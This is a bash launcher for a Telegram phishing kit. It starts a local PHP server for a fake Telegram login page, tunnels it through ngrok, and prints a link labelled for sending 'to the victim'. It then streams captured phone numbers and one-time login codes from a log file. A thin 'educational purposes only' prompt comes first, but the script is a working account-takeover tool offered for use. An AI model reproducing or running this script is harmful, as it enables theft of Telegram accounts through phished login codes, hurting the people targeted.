#!/bin/bash
clear
echo ""
echo ""
echo ""
printf "\e[1;33m[\e[0m + \e[1;33m] NGROK SERVER : TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
sleep 4
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32m T H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh
echo ""
echo -e $'\e[1;32m\e[0m\e[1;32m TELEGRAM ATTACK  \e[0m'
echo ""
echo ""
banner(){
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Telegram \e[0m\n"
printf "\n"
}
banner
                
                 read -p $'\e[1;33m[\e[0m\e[1;77m × \e[0m\e[1;33m]\e[0m\e[1;32m ENTER 01 : \e[0m' option
		 case $option in 
			 

                  01)cd sites/
                  cd telegram/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m + \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m + \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m + \e[1;33m] Send link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "PHONE_NUMBER" -e "OTP_CODE"

                ;;

                  




                   04)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m                                                         >> THANKS FOR JOIN US >> \e[0m'
                   sleep 1
                   exit
                ;;


                esac
                ;;
